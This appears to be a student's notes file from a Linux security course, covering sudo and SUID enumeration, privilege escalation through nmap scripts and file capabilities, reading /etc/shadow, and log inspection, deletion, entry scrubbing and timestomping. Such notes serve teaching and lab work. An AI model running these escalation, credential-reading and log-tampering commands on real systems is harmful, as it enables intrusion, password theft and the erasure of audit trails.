@@ -1,1 +1,136 @@
+https://sec.cybbh.io/public/security/latest/lessons/lesson-10-linux-exploit_sg.html
+https://sec.cybbh.io/-/public/-/jobs/842473/artifacts/slides/10-linux-priv-persist-cover.html
+gtfobins.github.io
+
+SUDO
+  Accountability is improved because of command logging
+  Operators can perform tasks without unlimited root privileges
+  Root password knowledge is truly limited
+  Privileges can be revoked without changing passwords
+  A canonical list of users with root privileges is maintained
+  There is less chance of a root shell being left unattended
+  A single file can be used to control access for an entire network
+
+
+
+
+student@lin-ops:~$ sudo -l                      -shows what commands the user has access to
+	(ALL : ALL) ALL
+student@lin-ops:~$ id				-shows user info
+	uid=1001(student) gid=1001(student) groups=1001(student),27(sudo),108(lxd)
+/etc/sudoers					-shows who has sudo access
+
+
+Vulnerable SUID/GUID executables
+find / -type f -perm /4000 -ls 2>/dev/null 	-Find SUID only files
+find / -type f -perm /2000 -ls 2>/dev/null 	-Find SGID only files
+find / -type f -perm /6000 -ls 2>/dev/null 	-Find SUID and/or SGID files
+find . -exec <command> \;			-if the /usr/bin/find executable is suid, it could be used to execute arbitrary commands
+
+
+If nmap is set SUID root, then it may be possible to become root using the following:
+echo 'os.execute ("/bin/bash")' > /tmp/escape.nse
+chmod +x /tmp/escape.nse
+nmap --script=/tmp/escape.nse
+
+getcap -r / 2>/dev/null				-To get a list of all files on a system that are configured with capabilities:
+find / -type f -exec getcap -r {} \; 2>/dev/null
+
+
+setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap		-sets capabilities
+nmap --privileged -O 192.168.X.X 		-"privileged" keyword is required as nmap expects to be run as root to perform this scan and this keeps it from performing this check.
+
+echo 'os.execute ("/bin/bash")' > /tmp/escape.nse
+chmod +x /tmp/escape.nse
+nmap --script=/tmp/escape.nse
+
+using GTFOBins					-find vulnerable binaries listed in this database based on target device
+sudo pxexec /bin/bash
+
+----------
+Vuln CAPABILITIES
+setcap cap_dac_read_search+ep /bin/tar
+tar -cvf - /etc/shadow | cat -
+setcap -r /bin/tar
+/usr/sbin/tcpdump =ep
+setcap CAP_DAC_READ_SEARCH+ep /bin/bash		-Set /bin/bash with capability to bypass permissions checking and read all files
+getcap -r /bin/bash 				-Verify the capability:
+/bin/bash = cap_dac_read_search+ep
+/bin/bash 					-Execute /bin/bash again so that it executes with the configured capability
+su test 					-Perform Test. Switch user to a user that can’t read senstive files such as
+
+cat: /etc/shadow: Permission denied
+
+cat < /etc/shadow
+	root:$6$gFPbZKYI$RuR7I0Adpo9fZXWJp2RVpndczzLmKNB9hnobfo5VPQLta87kJxjq0aqVpi6x1sy4dpY0j5eMPI5CvdrbmCE1t1:18277:0:99999:7:::
+	daemon:*:18248:0:99999:7:::
+--outputs omitted--
+
+------------------
+CRON JOBS
+
+
+WORKING WITH LOGS
+file /var/log/wtmp
+find /var/log -type f -mmin -10 2> /dev/null
+journalctl -f -u ssh
+journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
+
+Reading Files
+cat /var/log/auth.log | egrep -v "opened|closed"
+awk '/opened/' /var/log/auth.log
+last OR lastb OR lastlog
+strings OR dd            # for data files
+more /var/log/syslog
+head/tail
+
+Cleaning the Logs, BASIC
+	Delete
+rm -rf /var/log/...
+	Clear:
+cat /dev/null > /var/log/...
+echo > /var/log/...
+
+Cleaning The Logs, PRECISE
+Before we start cleaning, save the INODE!
+        Affect on the inode of using mv VS cp VS cat
+Know what we are removing (Entry times? IP? Whole file? Etc.)
+	Removes:
+egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
+	Replace:
+cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
+
+Timestomping
+    Access: updated when opened or used (grep, ls, cat, etc)
+    Modify: update content of file or saved
+    Change: file attribute change, file modified, moved, owner, permission
+touch -c -t 201603051015 1.txt   		-Explicit
+touch -r 3.txt 1.txt    			-Reference
+
+Check Remote
+Rsyslog******** test
+Newer Rsyslog references /etc/rsyslog.d/* for settings/rules
+Older version only uses /etc/rsyslog.conf
+Find out
+    grep "IncludeConfig" /etc/rsyslog.conf
+Reading rsyslogs
+	<facility>.<priority>
+Example:
+
+kern.*                                                # All kernel messages, all severities
+mail.crit
+cron.!info,!debug
+*.*  @192.168.10.254:514                                                    # Old format
+*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
+#mail.*
+
+# remote logging, all logs are being sent to the server at 192.168.10.254 on UDP port 514
+
+
+
+
+
+
+
+
 
